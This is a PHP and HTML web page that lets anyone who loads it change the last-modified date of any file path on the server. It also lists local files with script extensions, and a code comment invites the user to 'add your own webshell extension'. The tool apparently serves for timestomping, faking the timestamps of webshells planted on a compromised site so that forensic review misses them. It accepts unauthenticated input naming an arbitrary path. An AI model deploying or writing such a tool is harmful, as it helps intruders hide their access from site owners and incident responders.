<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Change File Last Modified Date</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            max-width: 600px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 10px; /* Updated */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
        }
        .file-list {
            text-align: left;
            margin-top: 20px;
        }
        .file-item {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        .file-item p {
            flex: 1;
            margin: 0;
            margin-right: 15px;
        }
        .copy-button {
            padding: 5px 8px;
            font-size: 12px;
            cursor: pointer;
            background-color: transparent;
            color: #4CAF50;
            border: 2px solid #4CAF50;
            border-radius: 8px;
            transition: background-color 0.3s, color 0.3s;
            margin-left: 23px;
        }
        .copy-button:hover {
            background-color: #4CAF50;
            color: white;
        }
        input[type="text"], input[type="datetime-local"], input[type="submit"] {
            border: 2px solid #ccc;
            border-radius: 15px;
            padding: 10px;
            width: 100%;
            box-sizing: border-box;
            margin-bottom: 10px;
            background-color: transparent;
        }
        input[type="submit"] {
            border: none;
            border-radius: 10px;
            padding: 10px 24px;
            background-color: transparent;
            color: #4CAF50;
            cursor: pointer;
            transition: background-color 0.3s, color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #4CAF50;
            color: white;
        }
    </style>
    <script>
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {}, () => {});
        }
    </script>
</head>
<body>
    <div class="container">
        <?php
        function changeLastModified($filePath, $newTimestamp) {
            if (!file_exists($filePath)) {
                return "File does not exist.";
            }
            if (!is_numeric($newTimestamp)) {
                return "Invalid timestamp.";
            }
            if (touch($filePath, $newTimestamp)) {
                return "Successfully changed.";
            } else {
                return "Failed to change.";
            }
        }
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $filePath = $_POST["filePath"];
            $newDateTime = $_POST["newDateTime"];
            $newTimestamp = strtotime($newDateTime);
            $result = changeLastModified($filePath, $newTimestamp);
            echo "<p>$result</p>";
        }
        function listFiles($directory, $extensions) {
            $files = [];
            foreach (new DirectoryIterator($directory) as $fileInfo) {
                if ($fileInfo->isFile() && in_array($fileInfo->getExtension(), $extensions)) {
                    $files[] = $fileInfo->getFilename();
                }
            }
            return $files;
        }
        $directory = '.';

        //you can add your own webshell extension
        $extensions = ['php', 'phtml', 'html', 'htm', 'shtml', 'ghtml', 'phar', 'php3', 'php4', 'php5', 'php7', 'php76', 'jsp', 'jspf', 'jspx', 'xsp', 'asp', 'aspx', 'py', 'c', 'bak', 'dat', 'rexx', 'cgi', 'cfm', 'sh'];
        $files = listFiles($directory, $extensions);
        ?>
        <form method="post" action="">
            <label for="filePath">File name:</label><br>
            <input type="text" id="filePath" name="filePath" required><br><br>
            <label for="newDateTime">New date:</label><br>
            <input type="datetime-local" id="newDateTime" name="newDateTime" required placeholder="YYYY-MM-DDTHH:MM"><br><br>
            <input type="submit" value="Change">
        </form>
    </div>
    <div class="file-list">
        <?php if (!empty($files)): ?>
            <?php foreach ($files as $file): ?>
                <div class="file-item">
                    <p><?php echo htmlspecialchars($file); ?></p>
                    <button class="copy-button" onclick="copyToClipboard('<?php echo htmlspecialchars($file); ?>')">Copy</button>
                </div>
            <?php endforeach; ?>
        <?php else: ?>
            <p>No files found with the specified extensions.</p>
        <?php endif; ?>
    </div>
</body>
</html>
